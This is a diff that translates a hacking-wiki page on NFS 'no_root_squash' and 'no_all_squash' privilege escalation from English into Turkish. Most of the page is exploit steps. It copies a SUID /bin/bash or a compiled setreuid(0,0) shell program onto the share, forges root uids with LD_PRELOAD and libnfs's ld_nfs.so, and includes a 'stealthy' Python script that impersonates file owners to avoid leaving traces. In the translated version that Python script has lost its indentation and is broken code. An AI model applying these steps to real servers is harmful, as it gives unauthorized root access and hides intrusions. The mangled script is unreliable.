@@ -1,19 +1,18 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+_ **/etc/exports** _ dosyasını okuyun, eğer **no_root_squash** olarak yapılandırılmış bir dizin bulursanız, o dizine **istemci olarak** **erişebilir** ve o dizin içinde **yerel** **root** gibi **yazabilirsiniz**.
 
-**no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+**no_root_squash**: Bu seçenek, istemcideki root kullanıcısına NFS sunucusundaki dosyalara root olarak erişim yetkisi verir. Bu da ciddi güvenlik sorunlarına yol açabilir.
 
-**no_all_squash:** This is similar to **no_root_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+**no_all_squash:** Bu, **no_root_squash** seçeneğine benzer ancak **root olmayan kullanıcılara** uygulanır. Hayal edin, nobody kullanıcısı olarak bir shell'iniz var; /etc/exports dosyasını kontrol ettiniz; no_all_squash seçeneği mevcut; /etc/passwd dosyasını kontrol edin; root olmayan bir kullanıcıyı taklit edin; o kullanıcı olarak bir suid dosyası oluşturun (nfs kullanarak montaj yaparak). SUID'yi nobody kullanıcısı olarak çalıştırın ve farklı bir kullanıcıya dönüşün.
 
-# Privilege Escalation
+# Yetki Yükseltme
 
-## Remote Exploit
+## Uzaktan Sömürü
 
-If you have found this vulnerability, you can exploit it:
+Bu güvenlik açığını bulduysanız, bunu sömürebilirsiniz:
 
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
-
+- **O dizini** bir istemci makinesinde **montajlayarak**, ve **root olarak** montajlı klasöre **/bin/bash** ikili dosyasını kopyalayarak ve ona **SUID** hakları vererek, o bash ikili dosyasını **kurban** makinesinden çalıştırarak.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -26,9 +25,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
-
+- **O dizini** bir istemci makinesine **bağlamak** ve **root olarak** bağlı klasöre SUID izinlerini kötüye kullanacak derlenmiş yükümüzü kopyalamak, ona **SUID** hakları vermek ve **kurban** makineden o ikili dosyayı çalıştırmak (burada bazı [C SUID yüklerini](payloads-to-execute.md#c) bulabilirsiniz).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -42,61 +39,57 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-
-## Local Exploit
+## Yerel Sömürü
 
 > [!NOTE]
-> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-> The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
-> Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
-> --_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
+> Makinenizden kurban makinesine bir **tünel oluşturabiliyorsanız, bu ayrıcalık yükseltmesini istismar etmek için Uzaktan versiyonu kullanmaya devam edebilirsiniz**.\
+> Aşağıdaki hile, dosya `/etc/exports` **bir IP gösteriyorsa** geçerlidir. Bu durumda **uzaktan istismarı kullanamayacaksınız** ve **bu hileyi kötüye kullanmanız gerekecek**.\
+> İstismarın çalışması için bir diğer gereklilik, **`/etc/export` içindeki dışa aktarmanın** **`insecure` bayrağını kullanmasıdır**.\
+> --_Eğer `/etc/export` bir IP adresi gösteriyorsa bu hilenin işe yarayıp yaramayacağından emin değilim_--
 
-## Basic Information
+## Temel Bilgiler
 
-The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.
+Senaryo, yerel bir makinede monte edilmiş bir NFS paylaşımını istismar etmeyi içerir ve bu, istemcinin uid/gid'ini belirlemesine izin veren NFSv3 spesifikasyonundaki bir hatayı kullanır; bu da yetkisiz erişimi mümkün kılabilir. İstismar, NFS RPC çağrılarını sahtelemek için bir kütüphane olan [libnfs](https://github.com/sahlberg/libnfs) kullanmayı içerir.
 
-### Compiling the Library
+### Kütüphaneyi Derleme
 
-The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. The compilation process involves the following commands:
-
+Kütüphane derleme adımları, çekirdek sürümüne bağlı olarak ayarlamalar gerektirebilir. Bu özel durumda, fallocate sistem çağrıları yorum satırına alınmıştır. Derleme süreci aşağıdaki komutları içerir:
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
+### Sömürü Gerçekleştirme
 
-### Conducting the Exploit
+Sömürü, root ayrıcalıklarını artıran ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve elde edilen ikili dosya (`a.out`), RPC çağrılarında uid'yi taklit etmek için `ld_nfs.so` kullanarak suid root ile paylaşıma yerleştirilir:
 
-The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:
+1. **Sömürü kodunu derleyin:**
 
-1. **Compile the exploit code:**
+```bash
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+```
 
-   ```bash
-   cat pwn.c
-   int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
-   gcc pwn.c -o a.out
-   ```
+2. **Sömürü paylaşımda yerleştirin ve uid'yi taklit ederek izinlerini değiştirin:**
 
-2. **Place the exploit on the share and modify its permissions by faking the uid:**
+```bash
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+```
 
-   ```bash
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
-   ```
+3. **Root ayrıcalıkları kazanmak için sömürüyü çalıştırın:**
+```bash
+/mnt/share/a.out
+#root
+```
 
-3. **Execute the exploit to gain root privileges:**
-   ```bash
-   /mnt/share/a.out
-   #root
-   ```
+## Bonus: NFShell ile Gizli Dosya Erişimi
 
-## Bonus: NFShell for Stealthy File Access
-
-Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
-
+Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmamak için) NFS paylaşımı ile etkileşimde bulunmak için bir Python betiği (nfsh.py) kullanılır. Bu betik, erişilen dosyanın uid'sini eşleştirerek, paylaşımda dosyalarla izin sorunları olmadan etkileşimde bulunmayı sağlar:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -104,23 +97,20 @@ import sys
 import os
 
 def get_file_uid(filepath):
-    try:
-        uid = os.stat(filepath).st_uid
-    except OSError as e:
-        return get_file_uid(os.path.dirname(filepath))
-    return uid
+try:
+uid = os.stat(filepath).st_uid
+except OSError as e:
+return get_file_uid(os.path.dirname(filepath))
+return uid
 
 filepath = sys.argv[-1]
 uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-
-Run like:
-
+Çalıştırın gibi:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
